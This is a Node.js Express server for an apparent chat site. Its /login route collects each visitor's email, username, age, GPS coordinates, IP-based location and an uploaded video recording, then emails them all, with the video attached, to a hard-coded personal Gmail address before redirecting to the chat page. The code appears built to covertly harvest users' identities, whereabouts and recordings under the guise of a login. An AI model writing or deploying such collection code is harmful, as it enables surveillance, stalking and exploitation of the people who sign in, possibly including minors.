const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const nodemailer = require('nodemailer');
const multer = require('multer');
const geoip = require('geoip-lite');
const path = require('path');
const fs = require('fs');
require('dotenv').config(); // Load environment variables

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Set up storage for video recordings
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname));
  },
});
const upload = multer({ storage });

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Email configuration using environment variables
const transporter = nodemailer.createTransport({
  service: 'hotmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.post('/login', upload.single('video'), async (req, res) => {
  try {
    const { email, username, age, lat, lon } = req.body;
    const ip = req.ip;
    const geo = geoip.lookup(ip);

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'aria.evercrest@gmail.com',
      subject: 'New User Login',
      text: `User Email: ${email}\nUsername: ${username}\nAge: ${age}\nIP: ${ip}\nLocation: ${geo ? `${geo.city}, ${geo.country}` : 'Unknown'}\nCoordinates: ${lat}, ${lon}`,
      attachments: [
        {
          filename: req.file.filename,
          path: req.file.path,
        },
      ],
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent: ' + info.response);
    res.redirect('/chat');
  } catch (error) {
    console.error(error);
    res.status(500).send('Error sending email');
  }
});

app.get('/chat', (req, res) => {
  res.sendFile(__dirname + '/public/chat.html');
});

io.on('connection', (socket) => {
  console.log('a user connected');
  
  socket.on('disconnect', () => {
    console.log('user disconnected');
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`listening on *:${PORT}`);
});
